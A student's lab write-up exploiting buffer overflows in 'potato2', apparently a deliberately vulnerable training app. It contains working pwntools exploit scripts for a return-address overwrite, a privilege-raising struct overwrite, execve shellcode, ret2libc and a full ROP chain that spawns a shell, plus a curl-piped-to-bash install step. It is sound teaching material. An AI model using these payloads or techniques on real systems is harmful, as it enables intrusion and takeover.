Student: Ernst Schwaiger
Date 2024-03-23

# Stack Corruption

The steps below were executed on a Kali 2024.03 system for x64 that runs in a VirtualBox hypervisor.

## Building potato2 for 32 bits

Packages to install upfront to get potato2 to compile for i386/32 bit, python virtual environment
and gdb enhanced features/gef:

```bash
sudo apt install gcc 
sudo apt install gcc-multilib
sudo apt install python3-virtualenv
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

Checkout the sources of `potato2` and `openssl`, the latter is required since we are going to
build potato2 as 32 bit binary, hence the `openssl` libraries need to be available as 32 bit
as well.

```sh
git clone https://github.com/edgecase1/potato2.git
git clone https://github.com/openssl/openssl.git
cd openssl
./Configure -m32 linux-generic32
make -sj
cd ..
make -sj
cp potato2/userlist .
```

The second make builds two binaries, `potato2` and `potato2_rop` which are going to be
the victim apps in the subsequent steps. Since the built `potato2` binaries require to have
the `userlist` file present in the current folder, this file is copied from the `potato2`
folder.

```Makefile
# needs to have openssl checked out as sibling folder of potato
# git clone https://github.com/openssl/openssl.git
# and requires installation of gcc multilib
# sudo apt install gcc-multilib for m32

WARN_OPTS=-Wno-deprecated-declarations -Wno-unused-result
SEC_OPTS=-fno-stack-protector -z execstack -no-pie
DEBUG_OPTS=-ggdb3 -O0
# turn on optimizations to get some ROP gadgets
DEBUG_OPTS_ROP=-ggdb3 -O2
INCLUDES=-Iopenssl/include -I/usr/include -I/usr/include/x86_64-linux-gnu -Ipotato2/src
DEFINES=-D_FORTIFY_SOURCE=0

CCOPTS = $(WARN_OPTS) $(SEC_OPTS) $(DEBUG_OPTS) $(INCLUDES) $(DEFINES)
# include glibc statically to get additional gadgets
CCOPTS4ROP = -static $(WARN_OPTS) $(SEC_OPTS) $(DEBUG_OPTS_ROP) $(INCLUDES) $(DEFINES)

CFILES = \
	potato2/src/main.c \
	potato2/src/runr.c \
	potato2/src/sock.c \
	potato2/src/userlist.c \
	potato2/src/func.c \
	potato2/src/login2.c

HFILES = \
	potato2/src/runr.h \
	potato2/src/sock.h \
	potato2/src/user.h \
	potato2/src/userlist.h 

.PHONY: clean all

all: potato potato_rop

# binary for usual attacks
potato: $(CFILES) $(HFILES)
	gcc -m32 $(CCOPTS) -o potato $(CFILES) -Lopenssl  -lssl -lcrypto 

# binary for ROP attack
potato_rop: $(CFILES) $(HFILES)
	gcc -m32 $(CCOPTS4ROP) -o potato_rop $(CFILES) -Lopenssl  -lssl -lcrypto 

clean:
	rm -f potato potato_rop
```

Now, potato2 can be built and run in the `potato` folder:

```bash
make -sj
./potato
./potato console
./potato server
```

On Kali systems, `LD_LIBRARY_PATH` is empty, hence an error message 
`error while loading shared libraries: libcrypto.so.3: cannot open shared object file` appears when
`./potato` is started. To get around that, add the folder where openssl was checked out to:

```bash
export LD_LIBRARY_PATH=<openssl_folder>:$LD_LIBRARY_PATH
```

## Spotting vulnerabilities

Before looking at the code, `grep` can be used for a quick scan through the source for finding
C stdlib functions that are insecure, or can be used in an insecure way:

```bash
find potato2/src -name "*.c" | xargs grep -w -n \
  -e "gets" \
  -e "strcpy" \
  -e "strcat" \
  -e "sprintf" \
  -e "vsprintf" \
  -e "scanf" \
  -e "fscanf" \
  -e "sscanf" \
  -e "memcpy" \
  -e "memmove" \
  -e "strtok"

potato2/src/login2.c:43:    strcpy(user->name, username);
potato2/src/login2.c:44:    sprintf(user->home, "/home/%s", username);
potato2/src/login2.c:45:    strcpy(user->shell, "/usr/bin/rbash");
potato2/src/func.c:60:    scanf("%d", &id);
potato2/src/func.c:187:    fscanf(stdin, "%s", input_username); // TODO security
potato2/src/userlist.c:240:    token = strtok(line, ":");
potato2/src/userlist.c:246:                strcpy(parsed_user->name, token);
potato2/src/userlist.c:257:                     strcpy(parsed_user->home, token);
potato2/src/userlist.c:260:                     strcpy(parsed_user->shell, token);
potato2/src/userlist.c:266:       token = strtok(NULL, ":");
```

The code at `func.c`, line 187 look promising. The function `fscanf` in `change_name()` reads
a string from `stdin` and stores it in `input_username`. If the user
enters more than `USERNAME_LENGTH` characters, a buffer overflow happens. By providing more
bytes than `input_username` can hold, the return address in the stack frame can be overwritten 
by a user-chosen value.

The subsequent statement puts the string terminator character at the first position in the 
passed string which holds a linefeed `0xa`, character. This is particularly relevant for the injection
of shellcode. One the one hand side, we can exploit that to inject a zero-byte in our shellcode
(we can't inject that via `stdin`), on the other side, we have to avoid that byte in our shellcode 
if we don't want to have our shellcode changed.

```c
void
change_name()
{
    char input_username[USERNAME_LENGTH];
        
    fprintf(stdout, "What is the name > ");
    //fgets(input_username, sizeof(input_username), stdin);
    fscanf(stdin, "%s", input_username); // TODO security
    input_username[strcspn(input_username, "\n")] = 0x00; // terminator instead of a newline

    strncpy(session.logged_in_user->name, input_username, strlen(input_username)+1);
    fprintf(stdout, "Name changed.\n");
}
```

The `strncpy()` call also provides a vulnerability for overwriting the heap. It copies the provided
username into the global buffer which holds the name of the currently logged-in user. Since it 
only checks for the length of the provided string, not for the size of the length field of the 
username, it is possible to overwrite the user structure as well:

```c
struct _user
{
     char name[20];
     char password_hash[32]; // md5
     int id;
     int gid;
     char home[50];
     char shell[50];
} typedef t_user;
```

## Setup of the debugging environment

Start a python virtual environment, install the `pwntools` package.

```bash
virtualenv venv
. ./venv/bin/activate
pip install pwntools
python3 pwn_potato2.py
```

Change the `elf` variable in `pwn_potato2.py` such that it runs the binary `./potato` in the current
folder, and stops in line 192 of func.c, the epilogue of `change_name()`. When `./potato` asks for a new name,
the script provides 100 'A's, which will be enough to invoke a buffer overflow:

```python
#!/usr/bin/env python3

from pwn import *
import sys

elf = ELF("./potato")
context.binary = elf
context.arch = 'i386'
context.bits = 32
context.endian = 'little'
context.os = 'linux'

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
break main
break func.c:192
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username
# logged in
#p.interactive()
p.sendline(b"changename")
payload=b"\x41"*100
p.sendline(payload)
p.interactive()
```

The python script is executed via `python3 pwn_potato2.py`, or directly via `./pwn_potato2.py`.

In the `gef` window, we issue `ni` which steps over the next assembly statement, then press enter a few times
until the debugger halts at the `ret` statement. In the next step, the debugger will set the instruction pointer
to the content of whatever is at the address pointed to by the `$esp` register. Printing the address can be done
by `x/4bx $esp`.

```gdb
x/4bx $esp 
0xffffcd2c:     0x41    0x41    0x41    0x41
```

## Create a payload to change the instruction pointer

The return address was successfully overwritten by 'A's. Currently it is not known exactly, which of the 100 'A's
have overwritten the return address. The `gef` debugger can generate a unique string pattern which will be helpful 
to find that out. Run `pattern create` in the `gef` prompt to obtain that pattern, then copy it into 
`pwn_potato2.py`as follows:

```python
# ...
#payload=b"\x41"*100
payload=b"aaaabaaacaaadaaaeaaafaaag<bytes left out for readability>keaakfaak"
# ...
```
Enter `q` in the debugger to stop it, press `Ctrl-c` to stop the python script. Re-run the python script, again proceed
to the `ret` statement, then issue `pattern search $esp`, which indicates a byte offset of 62, i.e. the bytes at offsets
[62..65] must be overwritten by the address we want to jump to.
To find out the address of the function `whoami()` in the `potato` binary, we can issue in a bash `nm potato | grep whoami`,
which returns, e.g. `0x0804b108`. Knowing the offset and the target address, `pwn_potato2.py` is adapted a second time:

```python
# ...
#payload=b"\x41"*100
#payload=b"aaaabaaacaaadaaaeaaafaaag<bytes left out for readability>keaakfaak"
payload=b"\x41"*62+p32(0x0804b108)
# ...
```

Stop debugger and python, re-run the python script, in the debugger, press `c` (continue). In the python shell,
the output of `whoami()` with the changed username is displayed. The debugger stopped with a segfault. This
is due to the fact that the current payload still invalidates the address of the previous stack frame, which
is stored in `$ebp`. In order to prevent that, we need to find out its position in the payload and its content 
in a non-overflow scenario, then put that value at the proper position in the payload.
For obtaining the offset, repeat the debugging scenario for getting the offset of `$esp`, just this time for
`$ebp`. We should get the offset 58, i.e. the stack frame pointer is immediately before the return address.
In the next run, we change the payload to "abc", i.e. we don't overflow, and inspect the `$ebp` content
in that scenario when we hit the breakpoint by `x/4bx $ebp`, which gives us, e.g. 
`0x38    0xce    0xff    0xff`, which is the little-endian representation for `0xffffce38`.
With that new knowledge, the payload can be adapted again:

```python
# ...
payload=b"\x41"*58 + b"\x38\xce\xff\xff" + p32(0x0804b108)
# ...
```

## become privileged user without changing execution path (not requested)

It is possible to get privileged user credentialy without overwriting the stack return address. If we
overwrite the global user data structure such that we obtain a user id of zero, we get the credentials
without crashing the potato2 application at all. For that purpose, we exploit the fact that the `strncpy()`
functon always appends the string terminator `0x00` to the taget string:

```python
# ...
# overwrite user structure with user-chosen id: 0
# This overwrites the bytes of the global user-id via the strncpy() call in func.c, 190
# since strncpy adds a null terminator at session.logged_in_user->name[54]
p.sendline(b"changename")
payload=b"\x41"*50 + b"\x42"*3 + b"\x0a"
p.sendline(payload)

# Repeat the same for session.logged_in_user->name[53]
p.sendline(b"changename")
payload=b"\x41"*50 + b"\x42"*2 + b"\x0a"
p.sendline(payload)

# Set our name back to peter
p.sendline(b"changename")
payload=b"peter" + b"\x0a"
p.sendline(payload)
p.interactive()
# At this point, we can use potato interactively again, but our user id is zero, 
# i.e. we are a "privileged user" and are allowed, e.g. to delete other users.
```

## change the execution flow to get authenticated for a privileged user

There is only one privileged user listed, which is `root`. In order to become root, the `login()` function
must be executed:

```c
void
login()
{
    char input_username[USERNAME_LENGTH];
    //char* input_password;
    char input_password[PASSWORD_LENGTH];
    t_user* user;

    fputs("Welcome!\n", stdout);
    fputs("username: ", stdout); fflush(stdout);
    fgets(input_username, USERNAME_LENGTH, stdin);
    input_username[strcspn(input_username, "\n")] = 0x00;
    // if terminal
    //input_password = getpass("Password: "); fflush(stdout);
    fputs("password: ", stdout); fflush(stdout);
    fgets(input_password, PASSWORD_LENGTH, stdin);
    input_password[strcspn(input_password, "\n")] = 0x00;

    printf("searching for user ...\n");
    if((user = get_user_by_name(input_username)) == NULL)
    {
        fprintf(stdout, "no such user\n");
        return;
    }

    printf("checking password ...\n");
    if(check_password(user, input_password) == 1)
    {
        fprintf(stdout, "You are authorized.\n");
        session.logged_in_user = user;
        session.start_time = time(0);
        chdir(user->home);
    }
    else
    {
    	fprintf(stderr, "Authentication failure\n");
    }
}
```

However, there first part of the function, which does the authentication must be skipped since the password is
unknown. The function must be called starting with the `session.logged_in_user = user;` statement. The address
of that statement can be found, e.g. like this

```bash
$ objdump -Sd potato | grep -C5 -w "session.logged_in_user = user;"
 804af13:       6a 01                   push   $0x1
 804af15:       8d 83 bd e6 ff ff       lea    -0x1943(%ebx),%eax
 804af1b:       50                      push   %eax
 804af1c:       e8 cf e1 ff ff          call   80490f0 <fwrite@plt>
 804af21:       83 c4 10                add    $0x10,%esp
        session.logged_in_user = user;
 804af24:       8b 45 f4                mov    -0xc(%ebp),%eax
 804af27:       89 83 1c 01 00 00       mov    %eax,0x11c(%ebx)
        session.start_time = time(0);
 804af2d:       83 ec 0c                sub    $0xc,%esp
 804af30:       6a 00 
```

The address is `0x804af24`. The first assembly statement writes the content of `(%ebp - 0xc)` into `%eax`. After
that statement, `%eax` holds the right hand side of the assignment statement. The address of the desired `root`
user can be found out by putting a breakpoint after `init()` was called, then by issuing `p user_list->head->user`,
which yieds `0x8050370`. That value must be copied onto `(%ebp - 0xc)`.

The left hand side of the assignment is `%ebx + 0x11c`. To find out the content of `%ebx`, set a breakpoint at 
the assignment statement, run `potato` normally and print the register content: `p $ebx`, which yields `0x804dff4`.

The next code sequence to examine is the epilogue of `change_name()`
```bash
$ objdump -Sd potato | grep -A15 -w "Name changed"
    fprintf(stdout, "Name changed.\n");
...
 804b046:       90                      nop
 804b047:       8b 5d fc                mov    -0x4(%ebp),%ebx
 804b04a:       c9                      leave
 804b04b:       c3                      ret

```

In `0x804b047`, `%ebx` is assigned the content of `%ebp -0x4`, i.e. four bytes before the `%ebp`, the desired value
`0x804dff4` must be written, i.e. the offset w.r.t the overflown buffer is 54. In the next step, the content of
the four byte entities at offset 50 and at offset 58 (base pointer) are retrieved by running `change_name()` without
buffer overflow, which gives the values `0xffffccf1` and `0xffffcdf8`. The last step is done by overwriting the
address `handle_client()` returns from in order to prevent the application from terminating. That return address
is overwritten by the address of `handle_client()` itself. The resulting payload is then:

```python
# ...
root_user=0x8050370                 # gotten via p user_list->head->user
base_ptr=0xffffcdf8                 # base pointer of change_name (i.e. stack frame address)
login_setuser=0x804af24             # part of login() function setting the currently logged in user: func.c, line 163
global_ptr=0x804dff4                # global pointer from which session->logged_in_user is changed in login()/content of $ebx
restart_handle_client=0x0804965a    # overwritten return address of after handle_client() finishes

payload=b"\x41"*50              # input_name \
 + p32(0xffffccf1)              # local var \
 + p32(global_ptr)              # content of %ebx \
 + p32(base_ptr)                # recorded base pointer of change_name()
 + p32(login_setuser)           # second part of login() that sets the current user \
 + b"\x41"*252                  # stack frame of handle_client() \
 + p32(root_user)               # address of the root user \
 + b"\x41"*12                   # rest of stack frame of handle_client() \
 + p32(restart_handle_client)   # return address from handle_client() call, overwritten by the address of handle_client()
# ...
```

## execute shellcode

For executing shellcode, the code must be injected into the overflowing buffer, and the return
address must be overwritten by an address in that buffer. The shellcode must be small enough to
fit in the overwritten buffer, which is 50 bytes in length.
This shellcode https://www.exploit-db.com/shellcodes/49768 must me modified slightly so it can
be used in the potato2 context:

```asm
    xor eax, eax      ; set eax to 0xb (execve syscall) 
    add al, 0x05      ; eax := eax + 5
    add al, 0x06      ; eax := eax + 6 (directly setting al to 0xb won't work)
    push 0x68732f2f   ; put /bin//sh on the stack, 
    push 0x6e69622f   ; (double// avoids having a 0x00 in the code) 
    mov ebx, esp      ; ebx := &"/bin//sh"
    int 0x80          ; syscall
```

This can be translated into a sequence of bytes via `nasm -f elf32 -l listfile.list shellcode.asm`:

```asm
     4 00000000 31C0                        xor eax, eax
     7 00000002 0405                        add al, 0x05
     8 00000004 0406                        add al, 0x06
     9 00000006 682F2F7368                  push 0x68732f2f
    10 0000000B 682F62696E                  push 0x6e69622f
    11 00000010 89E3                        mov ebx, esp
    12 00000012 CD80                        int 0x80
```

The byte sequence in `listfile.list` is the shellcode to inject on the buffer. Moreover,
the return address must be overwritten with the start of the injected shellcode.
In the example below, the shellcode is put at the beginning of `input_username, so
the return address must point there. The address can be retrieved by `p $input_username`
in the debugger, in the example below, it is `0xffffccde`:
```python
# ...
p.sendline(b"changename")

shellcode=(
    b"\x31\xc0\x04\x05\x04\x06\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
)

# append NOPs/0x90 bytes after the shellcode, can be arbitrary bytes, then append the
# address of the `input_username` buffer, this is where the shellcode starts
payload=shellcode + b"\x90"* (62 - len(shellcode)) + p32(0xffffccde)
print("Length of payload: "+ repr(len(payload)))
p.sendline(payload)
p.interactive()
```

Running this script will open up a shell in the terminal that runs the `potato` app.

## Return to libc attack

according to https://bufferoverflows.net/ret2libc-exploitation-example/

For running the libc attack, we need to find to find a `/bin/sh` string in the process memory.
When running the application in the gdb, and stopping at a breakpint, `vmmap` gives us the virtual address
ranges. Searching the heap address range via `find 0x0804f000, 0x08070000, "/bin/sh"`, will give us at
least one address, e.g. `0x804f7d0`. `x/10bx 0x804f7d0` prints out ten hex bytes at the address:

```gdb
gef➤  x/10bx 0x804f7d0
0x804f7d0:      0x2f    0x62    0x69    0x6e    0x2f    0x62    0x61    0x73
0x804f7d8:      0x68    0x00
```

Next, we need to find a glibc function like `system()`, or `execve()`, which we can jump to.:
```gdb
gef➤  p system
$1 = {<text variable, no debug info>} 0x2a3494c0 <system>
```

The last address we need is the address of the `exit()` function so the process exits gracefully, even
after the stack was smashed:
```gdb
gef➤  p exit
$2 = {<text variable, no debug info>} 0x2a335ac0 <exit>
```

This information can now be used tp craft the return to libc attack. Inject the address of `system()`,
followed by the address of `exit()` and the address of the `bin/sh` string:

```python
p.sendline(b"changename")
payload=b"\x41"*58+ b"\x38\xce\xff\xff" + p32(0x2a3494c0) + p32(0x2a335ac0) + p32(0x804f7d0)
p.sendline(payload)
p.interactive()
```

Running this script will open up a shell in the terminal that runs the `potato` app.

## create a custom shellcode or run a ROP attack

For the generation of a ROP/Return Oriented Programming attack, the `ROPgadget` or `Ropper` Python
libraries can be used. This example uses `ROPgadget`. It must be installed in the Python virtual
environment, then it can be used to scan the binary for gadgets and for creating a ROP chain. 
A gadget is a sequence of assembly statements which achieve a certain effect, they may e.g. write a certain 
value into a certain processor register. That sequence must be followed by a ret statement. 
A sequence of these gadgets that opens, for instance a shell, is called a ROP chain.

```bash
. ./venv/bin/activate
pip install ROPgadget
ROPgadget --binary potato --ropchain
```

However, `ROPGadget` cannot generate a ROP chain due to missing gadgets in the `potato` binary:

```
...
Unique gadgets found: 629

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [-] Can't find the 'mov dword ptr [r32], r32' gadget
```

The low number of gadgets is caused by the fact that libc is linked dynamically into the `potato` application,
i.e. `ROPgadget` cannot find any libc functions to take advantage of. This can be overcome by building `potato_rop` 
which links libc statically and by turns code optimizations on to -O2:

```makefile
...
DEBUG_OPTS=-ggdb3 -O2
...
potato: $(CFILES) $(HFILES)
	gcc -static -m32 $(CCOPTS) -o potato_rop $(CFILES) -Lopenssl  -lssl -lcrypto 
```

When running `ROPgadget --binary potato_rop --ropchain`, we get:

```
...
Unique gadgets found: 47334

ROP chain generation
===========================================================
...
#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b''

p += pack('<I', 0x0806970e) # pop edx ; pop ebx ; pop esi ; ret
p += pack('<I', 0x0811e040) # @ .data
...
p += pack('<I', 0x0804c6c2) # int 0x80
```

The generated ROP chain can not yet be used in `pwn_potato2.py`, some bytes in the ROP chain 
prevent the copying of the complete payload onto the stack, so to avoid their usage: 
`ROPgadget --binary potato_rop --ropchain --badbytes "00|09|0a|0c|0d"`.
This generates a ROP chain, which is copied completely, however the ROP chain still uses one gadget that
must be replaced:

```python
p += pack('<I', 0x080762b5) # inc eax ; pop es ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
```

This gadget is used to increment `eax`, however, the `pop es` causes a segfault. To find gadgets
which include the `inc eax` and `ret` commands:
`ROPgadget --binary potato_rop --ropchain --badbytes "00|09|0a|0c|0d" | grep "inc eax" | grep "ret"`

This returns a gadget which does not `pop esi`: `0x0806a8bc : inc eax ; pop edi ; ret`.
By replacing all occurrences of the gadget above with the new one:

```python
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
```

We obtain a working ROP chain which gives us a shell:

```python
#!/usr/bin/env python3

from pwn import *
from struct import pack

import sys

elf = ELF("./potato2/potato_rop")
context.binary = elf
context.arch = 'i386'
context.bits = 32
context.endian = 'little'
context.os = 'linux'

process = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(process, '''
#break func.c:183
break *change_name + 138
continue
''')

print(process.recvuntil(b"cmd> ")) # username
process.sendline(b"login")
# test user
process.sendline(b"peter")
process.sendline(b"12345")
print(process.recvuntil(b"cmd> ")) # username

process.sendline(b"changename")

# Padding goes here
p=b"\x41"*58 + p32(0x080e53c2)

# ROP sequence
p += pack('<I', 0x0806970e) # pop edx ; pop ebx ; pop esi ; ret
p += pack('<I', 0x0811e040) # @ .data
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804be89) # pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
p += b'/bin'
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0807d1fb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806970e) # pop edx ; pop ebx ; pop esi ; ret
p += pack('<I', 0x0811e044) # @ .data + 4
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804be89) # pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
p += b'//sh'
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0807d1fb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806970e) # pop edx ; pop ebx ; pop esi ; ret
p += pack('<I', 0x0811e048) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0805ba10) # xor eax, eax ; ret
p += pack('<I', 0x0807d1fb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0804901e) # pop ebx ; ret
p += pack('<I', 0x0811e040) # @ .data
p += pack('<I', 0x08061c9d) # pop ecx ; ret
p += pack('<I', 0x0811e048) # @ .data + 8
p += pack('<I', 0x0806970e) # pop edx ; pop ebx ; pop esi ; ret
p += pack('<I', 0x0811e048) # @ .data + 8
p += pack('<I', 0x0811e040) # padding without overwrite ebx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0805ba10) # xor eax, eax ; ret
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804c6c2) # int 0x80
process.sendline(p)

process.interactive()

```
